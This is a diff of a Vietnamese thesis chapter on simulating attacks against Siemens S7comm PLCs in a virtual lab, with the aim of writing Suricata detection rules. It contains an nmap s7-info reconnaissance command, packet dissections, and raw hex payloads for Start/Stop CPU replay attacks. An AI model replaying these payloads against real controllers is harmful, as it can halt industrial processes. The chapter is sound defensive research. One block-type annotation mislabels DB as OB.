@@ -1,16 +1,1912 @@
 \documentclass[../main.tex]{subfiles}
+\usepackage{tikz}
+\usetikzlibrary{arrows.meta,positioning,shapes.geometric}
 \begin{document}
 
-\section{Overview}
+\section{Tổng quan phương pháp nghiên cứu}
+\label{sec:methodology-overview}
 
-Phần này mô tả tổng quan giải pháp gồm những bước chính nào, hoạt động ra sao. Mục tiêu của phần này là cho người đọc một cái nhìn tổng thể về giải pháp. Để cho dễ hiểu thì nên có một biểu đồ mô tả luồng hoạt động của giải pháp đề xuất. 
+Chương này trình bày phương pháp thực nghiệm của đồ án: xây dựng môi trường mô phỏng hệ thống điều khiển công nghiệp, tái hiện các hành vi tấn công điển hình trên giao thức S7comm, phân tích lưu lượng mạng thu được, tạo cơ sở phục vụ xây dựng luật phát hiện bằng IDS Suricata ở các chương tiếp theo.
 
-\section{Tên của nội dung chi tiết thứ 1}
-Tên của các chương này đặt theo nội dung mà sinh viên sẽ trình bày trong từng chương. 
+Quy trình nghiên cứu được tổ chức thành năm bước liên tiếp như sau.
 
-Các chương tiếp theo mô tả chi tiết về các bước, các thuật toán trong giải pháp đề xuất. Có thể trình bày pseudocode cho từng bước. Chú ý, pseudocode chỉ có tác dụng làm chi tiết hoá giải thuật chứ không thay thế được phần thuyết minh về giải thuật. Đối với những chi tiết kỹ thuật khó hiểu nên có các hình minh hoạ để người đọc dễ hiểu. Mỗi một thuật toán/bước thực hiện nên tách ra thành một chương. 
+\begin{enumerate}
+    \item \textbf{Thiết lập môi trường thí nghiệm}: triển khai môi trường mô phỏng trên phần mềm ảo hoá VMWare sử dụng các máy ảo:
+    \begin{itemize}
+        \item PLC mô phỏng thông qua OpenPLC Runtime v4
+        \item HMI thông qua FUXA
+        \item Ubuntu Desktop/Server cho máy của kẻ tấn công, Router và IDS.
+    \end{itemize}
 
-\section{Tên của nội dung chi tiết thứ 2}
+    \textit{Ngoài ra trong một số kịch bản có sử dụng phần mềm TIA Portal + S7-PLCSIM Advanced + WinCC để mô phỏng PLC và HMI do giới hạn mô phỏng của OpenPLC Runtime v4.}
+  
+    \item \textbf{Mô phỏng kịch bản tấn công}: thực hiện trinh sát, phát lại lệnh Start/Stop, thao tác upload/download và tấn công man-in-the-middle trên giao thức S7comm.
+    
+    \item \textbf{Thu thập và phân tích lưu lượng}: thu thập lưu lượng mạng bằng Wireshark, phân tích cấu trúc gói tin S7comm để tạo cơ sở phục vụ xây dựng luật phát hiện bằng IDS Suricata.
+    
+    \item \textbf{Xây dựng luật phát hiện}: chuyển các dấu hiệu đã quan sát thành chữ ký Suricata (file \texttt{detect/rules/s7comm.rules}), căn cứ offset byte và mã chức năng S7comm.
+    
+    \item \textbf{Kiểm thử IDS}: chạy Suricata trên bản sao lưu lượng, đối chiếu cảnh báo với từng kịch bản đã mô phỏng.
+    
+\end{enumerate}
 
+Hình~\ref{fig:methodology-flow} mô tả luồng hoạt động tổng thể của giải pháp đề xuất. 
+
+\begin{figure}[H]
+    \centering
+    \begin{tikzpicture}[
+        node distance=0.55cm and 0.35cm,
+        box/.style={draw, rounded corners, align=center, font=\small,
+            minimum width=2.35cm, minimum height=0.85cm},
+        arr/.style={-{Stealth[length=2mm]}, thick}
+    ]
+        \node[box] (lab) {Thiết lập\\môi trường lab};
+        \node[box, right=of lab] (atk) {Mô phỏng\\kịch bản tấn công};
+        \node[box, right=of atk] (pcap) {Thu thập\\PCAP};
+        \node[box, right=of pcap] (ana) {Phân tích\\S7comm};
+        \node[box, right=of ana] (ids) {Luật Suricata\\và kiểm thử};
+        \draw[arr] (lab) -- (atk);
+        \draw[arr] (atk) -- (pcap);
+        \draw[arr] (pcap) -- (ana);
+        \draw[arr] (ana) -- (ids);
+    \end{tikzpicture}
+    \caption{Luồng phương pháp nghiên cứu của đồ án}
+    \label{fig:methodology-flow}
+\end{figure}
+
+Phạm vi chương này dừng ở bước phân tích lưu lượng và mô tả kịch bản; việc viết luật Suricata và đánh giá độ chính xác cảnh báo được trình bày ở chương sau.
+
+\section{Thiết lập môi trường thí nghiệm}
+\label{sec:lab-setup}
+
+\subsection{Nguyên tắc triển khai}
+
+Môi trường lab được thiết kế theo hướng mô phỏng có kiểm soát trên máy ảo. Tất cả các máy ảo được triển khai sử dụng đối tượng LAN Segment của VMWare (sử dụng 2 LAN Segment: 192.168.50.0/24 cho Controller Layer và 192.168.60.0/24 cho Superuser Layer). Hệ thống IDS được triển khai ở dạng Passive mode bằng cách đặt trong cùng LAN Segment. 
+
+Do cách hoạt động đặc biệt của VSwitch trong VMWare giống với hub thông thường thay vì switch nên chỉ cần IDS đặt trong cùng LAN Segment và bật chế độ Promiscuous mode cho card mạng là có tác dụng tương đương SPAN/mirror port trên một switch được triển khai vật lý.
+
+\subsection{Công cụ sử dụng}
+
+\textbf{OpenPLC} là một nền tảng mã nguồn mở cho phép  mô phỏng một PLC vật lý trên máy tính. Phần mềm tương thích với Windows, Linux, macOS, Raspberry Pi. Nó hỗ trợ chương trình điều khiển theo chuẩn IEC 61131-3, cho phép kết nối với SCADA, HMI, hoặc thiết bị công nghiệp khác. OpenPLC có 2 phần chính:
+
+- \href{https://autonomylogic.com/runtime}{\textbf{OpenPLC Runtime}}: đây là PLC engine giúp mô phỏng một PLC vật lý. OpenPLC Runtime V4 hỗ trợ nhiều giao thức công nghiệp, trong đó có giao thức Siemens S7comm. Khi kích hoạt giao thức này trên OpenPLC Runtime V4, runtime sẽ lắng nghe cổng 102 và phục vụ giao thức Siemens S7comm thông qua driver Snap7 bên trong. Đồ án sử dụng OpenPLC Runtime V4.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{Figure/S7_on_OpenPLC.png}
+    \caption{S7comm được kích hoạt trên OpenPLC Runtime V4}
+    \label{fig:S7_on_OpenPLC}
+\end{figure}
+
+
+- \href{https://autonomylogic.com/download}{\textbf{OpenPLC Editor}}: Đây là IDE để viết chương trình dành cho OpenPLC Runtime. Nó tương tác với OpenPLC Runtime thông qua Restful API cổng 8443. Trong đồ án sử dụng để viết code, complie chương trình, nạp chương trình vào PLC và debug chương trình. Đồ án sử dụng OpenPLC Editor V4.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{Figure/OpenPLC_Editor.png}
+    \caption{OpenPLC Editor để viết chương trình, biên dịch chương trình, nạp vào runtime và debug}
+    \label{fig:OpenPLC_Editor}
+\end{figure}
+
+\textbf{FUXA} (Docker \texttt{frangoteam/fuxa:snap7}, cổng 1881) đóng vai trò thiết kế và hiển thị giao diện HMI. Đây là một HMI mã nguồn mở, có hỗ trợ giao thức Siemens S7comm và chạy trên nền web.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{Figure/FUXA.png}
+    \caption{FUXA để thiết kế và hiển thị giao diện HMI}
+    \label{fig:FUXA}
+\end{figure}
+
+
+\textbf{Snap7}: một thư viện mã nguồn mở được phát triển để kết nối, truyền và điều khiển các thiết bị tự động hóa, là một trong những thư viện mã nguồn mở phổ biến nhất trong ngành tự động hóa.
+
+Snap7 hỗ trợ các giao thức truyền thông Siemens S7 (S7comm) để kết nối và truyền dữ liệu với các thiết bị tự động hóa Siemens. Nó cung cấp các tính năng chính như:
+
+\begin{itemize}
+    \item Đọc và ghi các biến trong PLC
+    \item Truy cập vào các khối DB và OB trong PLC
+    \item Cung cấp các thông tin về trạng thái của thiết bị
+\end{itemize}
+
+Các đặc điểm của Snap7: 
+
+\begin{itemize}
+    \item Có thể được sử dụng với nhiều ngôn ngữ lập trình phổ biến như C++, C#, Python, Java cho phép lập trình viên lựa chọn ngôn ngữ phù hợp nhất với dự án của mình. 
+    \item Hoạt động trên nhiều hệ điều hành, bao gồm Windows, Linux, và macOS, mang lại sự linh hoạt cao trong việc phát triển ứng dụng.
+    \item Tương thích với nhiều dòng PLC S7, hỗ trợ giao tiếp với các dòng PLC S7-200, S7-300, S7-400, S7-1200, và S7-1500, giúp dễ dàng tích hợp vào các hệ thống hiện có.
+\end{itemize}
+
+
+\section{Kịch bản tấn công và phân tích lưu lượng}
+\label{sec:attack-scenarios}
+
+Phần dưới đây trình bày chi tiết các kịch bản đã mô phỏng. 
+
+\subsection{Reconnaissance}
+\label{sec:reconnaissance}
+
+Sử dụng Nmap để quét thông qua NSE Scripts để phát hiện các thiết bị trong dải mạng. Script này sử dụng kỹ thuật quét riêng biệt dựa trên giao thức S7comm để tránh làm quá tải các thiết bị trong mạng OT.
+
+\begin{verbatim}
+nmap -p 102 --script s7-info <IP_ADDRESS>
+\end{verbatim}
+
+Output:
+
+\begin{verbatim}
+ubuntu@ubuntuserver2204:~$ nmap -p 102 --script s7-info 192.168.50.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2026-04-21 16:23 UTC
+Nmap scan report for 192.168.50.1
+Host is up (0.0018s latency).
+
+PORT    STATE  SERVICE
+102/tcp closed iso-tsap
+
+Nmap scan report for 192.168.50.10
+Host is up (0.0027s latency).
+
+PORT    STATE SERVICE
+102/tcp open  iso-tsap
+| s7-info:
+|   Module: 6ES7 315-2EH14-0AB0
+|   Basic Hardware: 6ES7 315-2EH14-0AB0
+|   Version: 3.2.6
+|   System Name: SNAP7-SERVER
+|   Module Type: CPU 315-2 PN/DP
+|   Serial Number: S C-C2UR28922012
+|_  Copyright: Original Siemens Equipment
+Service Info: Device: specialized
+
+Nmap done: 256 IP addresses (2 hosts up) scanned in 3.21 seconds
+\end{verbatim}
+
+
+Nmap đã phát hiện tại host \texttt{192.168.50.10} là máy ảo đang chạy OpenPLC Runtime với server S7 được bật. Nó nhận diện thiết bị này là Siemens PLC S7-300 series. Quan sát các gói tin thu được trong quá trình quét, nhận thấy quy trình như sau:
+
+
+\begin{enumerate}
+
+\item Ban đầu là \textbf{TCP SYN scan để tìm kiếm các thiết bị trong dải mạng}:
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/reconnaissance/image-2.png}
+    \caption{alt text}
+    \label{fig:sreconnaissanceimage2png}
+\end{figure}
+
+
+Có 2 thiết bị phản hồi gói tin RST mang IP đuôi \texttt{.50.1} và \texttt{50.10}. Với \texttt{50.1} là Router gateway của dải mạng và \texttt{50.10} là IP của PLC 01. Lọc theo địa chỉ IP này.
+
+
+\item \textbf{Quét cổng 102} của \texttt{.50.10}
+
+
+Các giai đoạn trong quá trình quét có thể được chia ra như sau:
+
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/reconnaissance/image-5.png}
+    \caption{alt text}
+    \label{fig:sreconnaissanceimage5png}
+\end{figure}
+
+
+
+\begin{itemize}
+    \item Thiết lập kết nối tới TCP 102 bằng Three-way Handshake của TCP
+\end{itemize}
+
+
+\begin{itemize}
+    \item Thiết lập COTP
+\end{itemize}
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/reconnaissance/image-4.png}
+    \caption{alt text}
+    \label{fig:sreconnaissanceimage4png}
+\end{figure}
+
+
+    Nguồn gửi ở đây là 01, tức máy trạm
+
+
+
+    \item \textbf{Thiết lập S7comm}
+
+
+Sau khi thiết lập COTP, client sẽ thiết lập S7comm bằng cách gửi một yêu cầu thiết lập giao tiếp S7 \texttt{Setup communication} với mã chức năng \texttt{0xF0} (gói tin 1046) tới server PLC và nhận được phản hồi ở gói tin 1047. 
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/reconnaissance/image-6.png}
+    \caption{alt text}
+    \label{fig:sreconnaissanceimage6png}
+\end{figure}
+
+
+Sau quá trình thiết lập S7 Communication, hai bên có thể bắt đầu trao đổi dữ liệu bằng các lệnh của S7. Ở đây là dùng lệnh \texttt{Read SZL} để đọc thông tin trạng thái của PLC. \texttt{Read SZL} là một subfunction trong nhóm chức năng CPU functions của S7comm.
+
+
+\textbf{SZL} hoặc SSL (System Status Lists) là một danh sách ảo miêu tả trạng thái hiện tại của PLC. PLC không lưu sẵn danh sách này mà nó chỉ tạo ra mỗi khi có yêu cầu đọc SZL từ Client. Khi nhận được yêu cầu, PLC sẽ thu thập thông tin trạng thái hiện tại của các thành phần trong PLC, đóng gói chúng vào một cấu trúc dữ liệu theo định dạng SZL và trả về cho Client. Danh sách SZL dài 16 bit như sau, cấu trúc như sau:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/reconnaissance/image-8.png}
+    \caption{alt text}
+    \label{fig:sreconnaissanceimage8png}
+\end{figure}
+
+
+
+Ví dụ với gói tin số 1048:
+
+
+\begin{verbatim}
+S7 Communication
+    Parameter: (Request) ->(CPU functions) ->(Read SZL)
+        Parameter head: 0x000112
+        Parameter length: 4
+        Method (Request/Response): Req (0x11)
+        0100 .... = Type: Request (4)
+        .... 0100 = Function group: CPU functions (4)
+        Subfunction: Read SZL (1)
+        Sequence number: 0
+    Data (SZL-ID: 0x0011, Index: 0x0001)
+        Return code: Success (0xff)
+        Transport size: OCTET STRING (0x09)
+        Length: 4
+        SZL-ID: 0x0011, Diagnostic type: CPU, Number of the partial list extract: All identification data records of a module, Number of the partial list: Module identification
+            0000 .... .... .... = Diagnostic type: CPU (0x0)
+            0000 0000 0001 0001 = Number of the partial list extract: All identification data records of a module (0x0011)
+            .... .... 0001 0001 = Number of the partial list: Module identification (0x11)
+        SZL-Index: 0x0001
+\end{verbatim}
+
+
+Request này yêu cầu PLC trả về thông tin về trạng thái hệ thống quản lý đối tượng (Object management system status) thông qua chức năng đọc SZL. Yêu cầu đọc tại địa chỉ SZL-ID \texttt{0x0011} và Index \texttt{0x0001}. Phần này trong SZL sẽ trả về: \texttt{Diagnostic type: CPU, Number of the partial list extract}. Cụ thể [[3]]:
+
+
+
+
+\begin{verbatim}
+Hex: 0x0011 =   0000    0000    00010001
+                |       |       |
+                |       |       +-- Lấy danh sách con nào, ở 
+                |       |           đây là Module Identification
+                |       +-- Muốn lấy phần nào trong danh sách con 
+                |           đó, bằng 0 là lấy hết danh sách con đó
+                +-- Module class: CPU
+\end{verbatim}
+
+
+\begin{itemize}
+    \item \texttt{Module class}: xác định loại thiết bị muốn đọc
+\end{itemize}
+
+
+\begin{table}[H]
+    \centering
+    \footnotesize
+    \begin{tabular}{|l|l|}
+        \hline
+        \textbf{Module class} & \textbf{Binary value} \\
+        \hline
+        CPU & 0000 \\
+        \hline
+        IM (Interface module) & 0100 \\
+        \hline
+        FM (Function module) & 1000 \\
+        \hline
+        CP (Communication processor) & 1100 \\
+        \hline
+    \end{tabular}
+\end{table}
+
+
+\begin{itemize}
+    \item Một vài loại \texttt{Partial list number}:
+\end{itemize}
+
+
+\begin{table}[H]
+    \centering
+    \footnotesize
+    \begin{tabular}{|l|l|}
+        \hline
+        \textbf{Partial list type} & \textbf{Binary value} \\
+        \hline
+        Module Identification & 0001 0001 \\
+        \hline
+        CPU Characteristics & 0001 0010 \\
+        \hline
+        Module Status & 0001 0011 \\
+        \hline
+        Communication Status & 0001 1100 \\
+        \hline
+        Connection Status & 0001 1101 \\
+        \hline
+        Diagnostic Buffer & 0010 0010 \\
+        \hline
+        Diagnostic Status & 0010 0011 \\
+        \hline
+        Module list (rack)  (*extended*) & 0001 0001 0001 \\
+        \hline
+        Memory info & 0001 0011 0001 \\
+        \hline
+        Protection Level & 0010 0011 0010 \\
+        \hline
+    \end{tabular}
+\end{table}
+
+
+PLC phản hồi lại ở gói tin số 1049:
+
+
+\begin{verbatim}
+S7 Communication
+    
+    . . .
+    Data (SZL-ID: 0x0011, Index: 0x0000)
+        Return code: Success (0xff)
+        Transport size: OCTET STRING (0x09)
+        Length: 120
+        SZL-ID: 0x0011, Diagnostic type: CPU, Number of the partial list extract: All identification data records of a module
+        . . .
+        SZL-Index: 0x0000
+        SZL partial list length in bytes: 28
+        SZL partial list count: 4
+
+        SZL data tree (list count no. 1)
+            Index: Identification of the module (0x0001)
+            MlfB (Order number of the module): 6ES7 315-2EH14-0AB0 
+            BGTyp (Module type ID): 0x00c0
+            Ausbg (Version of the module or release of the operating system): 4
+            Ausbe (Release of the PG description file): 1
+
+        SZL data tree (list count no. 2)
+            Index: Identification of the basic hardware (0x0006)
+            MlfB (Order number of the module): 6ES7 315-2EH14-0AB0 
+            BGTyp (Module type ID): 0x00c0
+            Ausbg (Version of the module or release of the operating system): 4
+            Ausbe (Release of the PG description file): 1
+
+        SZL data tree (list count no. 3)
+            Index: Identification of the basic firmware (0x0007)
+            MlfB (Order number of the module):                     
+            BGTyp (Module type ID): 0x00c0
+            Ausbg (Version of the module or release of the operating system): 22019
+            Ausbe (Release of the PG description file): 518
+
+        SZL data tree (list count no. 4)
+            Index: Identification of the firmware-extension (0x0081)
+            MlfB (Order number of the module): Boot Loader         
+            BGTyp (Module type ID): 0x0000
+            Ausbg (Version of the module or release of the operating system): 16672
+            Ausbe (Release of the PG description file): 2313
+\end{verbatim}
+
+
+Gói tin này đã trả về được giá trị Module Identificatio, ứng với trường \textbf{Module: 6ES7 315-2EH14-0AB0} mà như đã thấy trong output của Nmap.
+
+
+Tiếp tục là yêu cầu đọc lại SZL-ID \texttt{0x001c}, tức đọc danh sách con \texttt{Communication Status} của module class \texttt{CPU}.
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/reconnaissance/image-7.png}
+    \caption{alt text}
+    \label{fig:sreconnaissanceimage7png}
+\end{figure}
+
+
+\begin{verbatim}
+S7 Communication
+    . . .
+    Data (SZL-ID: 0x001c, Index: 0x0000)
+
+        SZL-Index: 0x0000
+        SZL partial list length in bytes: 34
+        SZL partial list count: 10
+
+        SZL data tree (list count no. 1)
+            Index: Name of the automation system (0x0001)
+            Name (Name of the PLC): SNAP7-SERVER
+            Reserved: 0000000000000000
+
+        SZL data tree (list count no. 2)
+            Index: Name of the module (0x0002)
+            Name (Name of the module): CPU 315-2 PN/DP
+            Reserved: 0000000000000000
+
+        SZL data tree (list count no. 3)
+            Index: Plant designation of the module (0x0003)
+            Tag (Plant identification of the module): 
+
+        SZL data tree (list count no. 4)
+            Index: Copyright entry (0x0004)
+            Copyright: Original Siemens Equipment
+            Reserved: 000000000000
+
+        SZL data tree (list count no. 5)
+            Index: Serial number of the module (0x0005)
+            Serialn (Serialnumber of the module): S C-C2UR28922012
+            Reserved: 0000000000000000
+
+        SZL data tree (list count no. 6)
+            Index: Module type name (0x0007)
+            Cputypname (Module type name): CPU 315-2 PN/DP
+        
+        SZL data tree (list count no. 7)
+            Index: Serial number of the memory card (0x0008)
+            Sn_mc/mmc (Serial number of the Memory Card/Micro Memory Card): MMC 267FF11F
+        
+        SZL data tree (list count no. 8)
+            Index: Manufacturer and profile of a CPU module (0x0009)
+            Manufacturer_id: 0x002a
+            Profile_id: 0xf600
+            Profile_spec_typ: 0x0001
+            Reserved: 0000000000000000000000000000000000000000000000000000
+        
+        SZL data tree (list count no. 9)
+            Index: OEM ID of a module (0x000a)
+            Oem_copyright_string (OEM Copyright ID): 
+            Oem_id (OEM ID): 0x0000
+            Oem_add_id (OEM additional ID): 0x00000000
+        
+        SZL data tree (list count no. 10)
+            Index: Location ID of a module (0x000b)
+            Loc_id (Location designation): 
+\end{verbatim}
+
+
+Gói tin đã trả về các thông tin để hiển thị trên các trường \textbf{Serial Number: S C-C2UR28922012}, \textbf{Version: 3.2.6}, \\textbf{System Name: SNAP7-SERVER}, \textbf{Module Type: CPU 315-2 PN/DP}, \textbf{Copyright: Original Siemens Equipment} như trong output của Nmap.
+
+\subsection{Scanning with other tools based on DCP}
+
+
+\textbf{DCP (Discovery and Basic Configuration Protocol)} là một giao thức nằm trong bộ tiêu chuẩn PROFINET. Nó được sử dụng để khám phá và cấu hình các thiết bị trong mạng PROFINET. Đây là giao thức chủ yếu được sử dụng để kết nối tới các PLC chạy trên PROFINET \textbf{trước khi chúng có thể được cấu hình IP}, do DCP là một giao thức hoạt động ở Layer 2 Data Link (Giống ARP trong TCP/IP). Một DCP identify request sẽ được gửi đi để khám phá các thiết bị trong mạng và đợi phản hồi từ các thiết bị đó.
+
+
+DCP có thể làm 3 việc chính:
+
+\begin{enumerate}
+    \item \textbf{Discovery}: Scan tất cả các thiết bị đang kết nối trong cùng một mạng LAN.
+\end{enumerate}
+
+
+\begin{enumerate}
+    \item \textbf{Basic Configuration}: Gán địa chỉ IP, Subnet Mask, Gateway, NameOfStation cho thiết bị.
+\end{enumerate}
+
+
+\begin{enumerate}
+    \item \textbf{Identification}: Yêu cầu một thiết bị cụ thể nháy đèn LED để có thể xác định đúng vị trí vật lý của nó trong tủ điện.
+\end{enumerate}
+
+
+Có một vài cách để quét các thiết bị PLC thông qua DCP:
+
+
+\begin{itemize}
+    \item Mở TIA Portal rồi bấm quét tìm PLC
+    \item Sử dụng module auxiliary/scanner/scada/profinet\_siemens trong Metasploit
+    \item Sử dụng script \textbackslash{}texttt\{SiemensScan.py\} (\url{./SiemensScan.py})
+\end{itemize}
+
+
+Tuy nhiên đã thử trong dự án này để quét OpenPLC nhưng không phát hiện được PLC. Điều  này là do OpenPLC Runtime không hỗ trợ DCP.
+
+
+\subsection{Quét các block trên PLC}
+
+
+Sau khi quét thông tin PLC, ta có thể quét các block trên PLC để lấy thông tin về các block chương trình điều khiển sử dụng Snap 7 \texttt{.list\_blocks()} và \texttt{.list\_blocks\_of\_type(type)}. Script tại đây (\url{./scanBlock.py}).
+
+
+\begin{verbatim}
+All blocks: <block list count OB: 0 FB: 0 FC: 0 SFB: 0 SFC: 0x0 DB: 2 SDB: 0>
+\end{verbatim}
+
+
+\begin{verbatim}
+DB 1:
+    Block type: 10
+    Block number: 1
+    Block language: 5
+    Block flags: 1
+    MC7Size: 128
+    Load memory size: 220        
+    Local data: 0
+    SBB Length: 20
+    Checksum: 0
+    Version: 1
+    Code date: b'1999/11/18'
+    Interface date: b'1999/11/18'
+    Author: b''
+    Family: b''
+    Header: b''
+
+DB 2:
+    Block type: 10
+    Block number: 2
+    Block language: 5
+    Block flags: 1
+    MC7Size: 128
+    Load memory size: 220
+    Local data: 0
+    SBB Length: 20
+    Checksum: 0
+    Version: 1
+    Code date: b'1999/11/18'
+    Interface date: b'1999/11/18'
+    Author: b''
+    Family: b''
+    Header: b''
+\end{verbatim}
+
+
+Trong PLC sẽ bao gồm các block:
+
+
+\begin{itemize}
+    \item \textbf{OB} (Organization Block): Đây là block chính để tổ chức chương trình điều khiển. Giống hàm \texttt{main () \{\}} trong C++.
+\end{itemize}
+
+
+\begin{itemize}
+    \item \textbf{(S)DB} ( (System) Data Block): Chứa dữ liệu cần dùng bởi chương trình điều khiển. DB là block dữ liệu do người dùng tạo ra, còn SDB là block dữ liệu hệ thống do Siemens tạo ra.
+\end{itemize}
+
+
+\begin{itemize}
+    \item \textbf{(S)FC} ( (System) Function): Chứa các hàm để có thể tái sử dụng trong chương trình điều khiển. FC là \textbf{stateless}, tức nó không lưu trạng thái/không có bộ nhớ riêng
+\end{itemize}
+
+
+\begin{itemize}
+    \item \textbf{(S)FB} ( (System) Function Block): Giống FC nhưng là \textbf{stateful}. Thường thì nó hay liên kết với một DB để lưu trạng thái của nó.
+\end{itemize}
+
+
+Tuy nhiên do giới hạn mô phỏng của OpenPLC Runtime mà nó chỉ hiện thị được block DB \texttt{DB: 2} mặc dù hiện tại PLC đang chạy chương trình điều khiển (Khi này OB của chương trình sẽ khác 0)
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/reconnaissance/image.png}
+    \caption{alt text}
+    \label{fig:ksreconnaissanceimagepng}
+\end{figure}
+
+
+Với mỗi datablock, thu được các thông tin như:
+
+
+
+\begin{verbatim}
+DB 1:
+    Block type: 10                   -> 10(decimal) = 0x0A(hex) = OB(block type)
+    Block number: 1                  -> Số thứ tự của block trong PLC (0x0001)
+    Block language: 5                -> Ngôn ngữ lập trình của block (AWL, KOP, FUP, SCL, DB, GRAPH) (0x05)
+    Block flags: 1                
+    MC7Size: 128                     -> Độ lớn vùng dữ liệu có thể đọc/ghi
+    Load memory size: 220            -> Vùng dữ liệu có thể đọc/ghi + header/metadata 
+    Local data: 0                    -> Dữ liệu stack. DB không có stack như block logic lên bằng 0
+    SBB Length: 20                   
+    Checksum: 0                      -> Checksum của block (0x00)
+    Version: 1                       
+    Code date: b'1999/11/18'         -> Ngày tạo block (b'1999/11/18'). Lỗi trên mô phỏng PLC ảo
+    Interface date: b'1999/11/18'    -> Ngày cập nhật block (b'1999/11/18'). Lỗi trên mô phỏng PLC ảo
+    Author: b''                    
+    Family: b''                      
+    Header: b''                     
+\end{verbatim}
+
+
+\textit{Xem các thông số trong S7\_constants.txt (\url{../../docs/Report/S7_constants.txt}).}
+
+
+Quan sát các gói tin trong quá trình quét block:
+
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.9\textwidth]{../attacks/reconnaissance/image-1.png}
+    \caption{alt text}
+    \label{fig:sreconnaissanceimage1png}
+\end{figure}
+
+
+\begin{enumerate}
+    \item Gói số 13, 14 khởi tạo kết nối S7 command
+\end{enumerate}
+
+
+\begin{enumerate}
+    \item Gói số 15, 16 là yêu cầu đọc danh sách tất cả các block
+\end{enumerate}
+
+
+\begin{verbatim}
+S7 Communication
+    Header: (Userdata)
+        Protocol Id: 0x32
+        ROSCTR: Userdata (7)
+        Redundancy Identification (Reserved): 0x0000
+        Protocol Data Unit Reference: 256
+        Parameter length: 8
+        Data length: 4
+    Parameter: (Request) ->(Block functions) ->(List blocks)
+        Function: CPU services (0x00)
+        Item count: 1
+        Variable specification: 0x12
+        Length of following address specification: 4
+        Syntax Id: ParameterShort (0x11)
+        01.. .... = Type: Request (1)
+        ..00 0011 = Function group: Block functions (3)
+        Subfunction: List blocks (1)
+        Sequence number: 0
+    Data
+        Return code: Object does not exist (0x0a)
+        Transport size: NULL (0x00)
+        Length: 0
+\end{verbatim}
+
+
+Đây là request thuộc nhóm \texttt{CPU services} > \texttt{Block functions} > \texttt{List blocks}. Kết quả sẽ trả về các block trong PLC:
+
+
+\begin{verbatim}
+S7 Communication
+    Header: (Userdata)
+        Protocol Id: 0x32
+        ROSCTR: Userdata (7)
+    . . .
+    Parameter: (Response) ->(Block functions) ->(List blocks)
+        Function: CPU services (0x00)
+        Item count: 1
+        Variable specification: 0x12
+        Length of following address specification: 8
+        Syntax Id: ParameterExtended (0x12)
+        10.. .... = Type: Response (2)
+        ..00 0011 = Function group: Block functions (3)
+        Subfunction: List blocks (1)
+    . . .
+    Data
+        Return code: Success (0xff)
+        Transport size: OCTET STRING (0x09)
+        Length: 28
+        Item [1]: (Block type OB)
+            Block type: 08 (OB)
+            Block count: 0
+        Item [2]: (Block type FB)
+            Block type: 0E (FB)
+            Block count: 0
+        Item [3]: (Block type FC)
+            Block type: 0C (FC)
+            Block count: 0
+        Item [4]: (Block type DB)
+            Block type: 0A (DB)
+            Block count: 2
+        Item [5]: (Block type SDB)
+            Block type: 0B (SDB)
+            Block count: 0
+        Item [6]: (Block type SFC)
+            Block type: 0D (SFC)
+            Block count: 0
+        Item [7]: (Block type SFB)
+            Block type: 0F (SFB)
+            Block count: 0
+\end{verbatim}
+
+
+\begin{enumerate}
+    \item Gói số 17, 18 tiếp tục yêu cầu đọc thông tin về các block khả dụng, ở đây là block DB \texttt{DB: 2}.
+\end{enumerate}
+
+
+\begin{enumerate}
+    \item Gói tin số 19, 20 đọc thông tin về DB1:
+\end{enumerate}
+
+
+\begin{verbatim}
+S7 Communication
+   ....
+    Data [DB 1]
+        Return code: Success (0xff)
+        Transport size: OCTET STRING (0x09)
+        Length: 8
+        Block type: 0A (DB)
+        Block number: 00001
+        Filesystem: A (Active embedded module)
+\end{verbatim}
+
+
+Response:
+
+
+\begin{verbatim}
+S7 Communication
+    . . .
+    Data: (Block:[DB 1])
+        Return code: Success (0xff)
+        Transport size: OCTET STRING (0x09)
+        Length: 78
+        Block type: \x01 (Unknown Block type: 0x0100)
+        Length of Info: 74
+        Unknown blockinfo 2: 0x2200
+        Constant 3: pp
+        Unknown byte(s) blockinfo: 01
+        0000 0001 = Block flags: 0x01, Linked
+        Block language: DB (5)
+        Subblk type: DB (10)
+        Block number: 1
+        Length load memory: 220
+        Block Security: None (0)
+        Code timestamp: Nov 18, 1999 00:00:00.000
+        Interface timestamp: Nov 18, 1999 00:00:00.000
+        SSB length: 20
+        ADD length: 0
+        Localdata length: 0
+        MC7 code length: 128
+        Author: 
+        Family: 
+        Name (Header): 
+        Version (Header): 0.1
+        Unknown byte(s) blockinfo: 00
+        Block checksum: 0x0000
+        Reserved 1: 0x00000000
+        Reserved 2: 0x00000000
+\end{verbatim}
+
+
+Giống với các thông tin đã thu được từ script \texttt{scanBlock.py}.
+
+\end{enumerate}
+
+
+\subsection{4.3 Start/Stop PLC (Replay Attack)}
+\label{sec:start_stop_plc}
+
+
+Đây là kiểu \textbf{replay attack} điển hình nhắm vào PLC: tái sử dụng các gói S7comm đã bắt được khi TIA Portal thực hiện lệnh \textbf{Start CPU} / \textbf{Stop CPU} trên S7-300, mà không cần xác thực bổ sung trên kênh S7comm.
+
+\subsubsection{Payload đã capture}
+
+
+\begin{table}[H]
+    \centering
+    \footnotesize
+    \begin{tabular}{|l|l|l|}
+        \hline
+        \textbf{Lệnh} & \textbf{Function code} & \textbf{Payload (hex)} \\
+        \hline
+        Start CPU & `0x28` (PLC Control / PI-Service `P\_PROGRAM`) & `0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d` \\
+        \hline
+        Stop CPU & `0x29` (PLC Stop) & `0300002102f0803201000006000010000029000000000009505f50524f4752414d` \\
+        \hline
+    \end{tabular}
+\end{table}
+
+Cấu trúc gói tin nhóm lệnh điều khiển chức năng PLC Control và PLC Stop:
+
